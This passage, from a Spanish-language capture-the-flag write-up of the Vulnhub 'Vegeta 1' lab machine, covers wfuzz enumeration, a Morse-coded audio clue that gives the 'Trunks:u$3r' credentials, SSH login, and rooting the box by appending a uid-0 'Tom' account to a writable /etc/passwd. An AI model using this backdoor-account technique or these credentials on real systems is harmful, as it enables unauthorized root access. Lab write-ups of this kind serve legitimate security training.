───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: users.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ goku
   2   │ vegeta
   3   │ cell
   4   │ bulma
   5   │ freezer
   6   │ gohan
   7   │ trunks
   8   │ piccolo
   9   │ milk
  10   │ broly
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Vamos a emplear la herramienta `wfuzz`

```bash
❯ wfuzz -c --hc=404 -t 200 -w users.txt -u http://192.168.100.30/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.30/FUZZ
Total requests: 10

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000004:   301        9 L      28 W       316 Ch      "bulma"                                                        

Total time: 0.014629
Processed Requests: 10
Filtered Requests: 9
Requests/sec.: 683.5455
```

`bulma` existe asi que vemos en la web que hay un `.wav`

![](/assets/images/vh-writeup-Vegeta1/Web10.png)

Vamos a descargarlo y escuchar el sonido

Despues de escuchar el audio nos damos cuenta que es codigo `morse` asi que vamos a buscar alguna web para que nos tradusca lo que dice

Puedes usar esta web para escuchar el sonido y ver la traduccion <https://morsecode.world/international/decoder/audio-decoder-adaptive.html>

Basicamente nos esta dando la contraseña del usuario `Trunks`

![](/assets/images/vh-writeup-Vegeta1/Web11.png)

`Trunks:u$3r`

Vamos a probar las credenciales por `ssh`

Y funcionan

```
❯ ssh trunks@192.168.100.30
trunks@192.168.100.30's password: 
Linux Vegeta 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jun 28 21:16:00 2020 from 192.168.43.72
trunks@Vegeta:~$ whoami
trunks
trunks@Vegeta:~$ id
uid=1000(trunks) gid=1000(trunks) groups=1000(trunks),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
trunks@Vegeta:~$ 
```

## Escalada de Privilegios

Podemos ver los archivos pero antes de eso vamos a buscar por privilegios `SUID`

```bash
trunks@Vegeta:~$ ls -la
total 28
drwxr-xr-x 3 trunks trunks 4096 Jun 28  2020 .
drwxr-xr-x 3 root   root   4096 Jun 28  2020 ..
-rw------- 1 trunks trunks  382 Jun 28  2020 .bash_history
-rw-r--r-- 1 trunks trunks  220 Jun 28  2020 .bash_logout
-rw-r--r-- 1 trunks trunks 3526 Jun 28  2020 .bashrc
drwxr-xr-x 3 trunks trunks 4096 Jun 28  2020 .local
-rw-r--r-- 1 trunks trunks  807 Jun 28  2020 .profile
trunks@Vegeta:~$ 
```

Vamos a leer los archivos que vimos 

```bash
trunks@Vegeta:/$ find / -perm -4000 2>/dev/null
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/mount
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
trunks@Vegeta:/$ 
```

Esto es lo que contiene `.bash_history` vemos que esta migrando al usuario `Tom` lo esta metiendo al `/etc/passwd` y le esta seteando una `password` 

```bash
trunks@Vegeta:~$ cat .bash_history 
perl -le ‘print crypt(“Password@973″,”addedsalt”)’
perl -le 'print crypt("Password@973","addedsalt")'
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd[/sh]
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
ls
su Tom
ls -la
cat .bash_history 
sudo apt-get install vim
apt-get install vim
su root
cat .bash_history 
exit
trunks@Vegeta:~$ 
```

No existe el usuario `Tom`

```bash
trunks@Vegeta:~$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
trunks:x:1000:1000:trunks,,,:/home/trunks:/bin/bash
trunks@Vegeta:~$ 
```

Podemos escribir dentro del `/etc/passwd`

```bash
trunks@Vegeta:~$ ls -l /etc/passwd
-rw-r--r-- 1 trunks root 1486 Jun 28  2020 /etc/passwd
trunks@Vegeta:~$ 
```

Pues entonces podemos agregar a un usuario y vamos a agregar al mismo `Tom` para convertirnos en `root` dandole la misma contraseña que le esta dando `Password@973`


```bash
trunks@Vegeta:~$ echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
trunks@Vegeta:~$ su Tom
Password: 
root@Vegeta:/home/trunks# whoami
root
root@Vegeta:/home/trunks# id
uid=0(root) gid=0(root) groups=0(root)
root@Vegeta:/home/trunks# 
```

## Root flag

Podemos leer la `flag.txt`

```
root@Vegeta:~# cat root.txt 

                               ,   ,'|
                             ,/|.-'   \.
                          .-'  '       |.
                    ,  .-'              |
                   /|,'                 |'
                  / '                    |  ,
                 /                       ,'/
              .  |          _              /
               \`' .-.    ,' `.           |
                \ /   \ /      \          /
                 \|    V        |        |  ,
                  (           ) /.--.   ''"/
                  "b.`. ,' _.ee'' 6)|   ,-'
                    \"= --""  )   ' /.-'
                     \ / `---"   ."|'
  V E G I I T A       \"..-    .'  |.
                       `-__..-','   |
                     _.) ' .-'/    /\.
               .--'/----..--------. _.-""-.
            .-')   \.   /     _..-'     _.-'--.
           / -'/      """""""""         ,'-.   . `.
          | ' /                        /    `   `. \
          |   |                        |         | |
           \ .'\                       |     \     |
          / '  | ,'               . -  \`.    |  / /
         / /   | |                      `/"--. -' /\
        | |     \ \                     /     \     |
 	| \      | \                  .-|      |    |


Hurray you got root

Share your screenshot in telegram : https://t.me/joinchat/MnPu-h3Jg4CrUSCXJpegNw
```






























































